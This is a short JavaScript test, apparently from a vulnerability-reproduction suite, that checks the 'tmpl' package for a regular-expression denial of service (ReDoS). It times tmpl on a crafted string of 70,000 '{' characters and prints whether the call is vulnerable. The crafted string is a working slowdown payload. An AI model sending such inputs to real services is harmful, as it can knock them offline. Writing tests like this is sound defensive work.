// test("ReDoS in tmpl", () => {
  const measureTime = require("../utils").measureTime;
  const tmpl = require("tmpl");
  let payload = "hello, " + "{".repeat(7 * 10000) + "day";
  let t = measureTime(function () {
    tmpl(payload, { day: "tomorrow" });
  });
  let time = t[0] + t[1] / 1000000000;
if (time > 1) {
	console.log("this_is_vulnerable")
} else {
	console.log("this_is_OK")
}
// });
